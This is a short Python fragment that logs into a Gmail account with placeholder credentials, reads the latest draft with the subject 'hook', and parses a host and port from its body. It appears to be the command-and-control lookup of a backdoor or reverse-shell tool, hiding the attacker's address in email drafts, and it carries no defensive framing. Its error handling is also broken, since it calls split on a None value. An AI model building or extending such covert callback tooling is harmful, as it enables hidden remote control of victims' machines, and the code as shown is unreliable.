import imaplib
import email

def get_server():	
	username = 'email'
	password = 'password'
	mail = imaplib.IMAP4_SSL('imap.gmail.com')
	mail.login(username,password)
	mail.select("[Gmail]/Drafts")
	try:
		result,ids = mail.uid('search', None, '(HEADER Subject "hook")')
		uids = ids[0].decode('utf-8').split()
		result, data = mail.uid('fetch', uids[-1], '(RFC822)')
		raw = data[0][1].decode('utf-8')
		smail = email.message_from_string(raw)
		part=[]
		if smail.is_multipart():
		    for i in smail.get_payload():
		        part.append(i.get_payload())
		cmd = part[0].strip('\r\n')
	except:
		cmd=None
	mail.close()
	mail.logout()
	cmd = cmd.split(':')
	host = cmd[0]
	port = cmd[1]
	return host,port
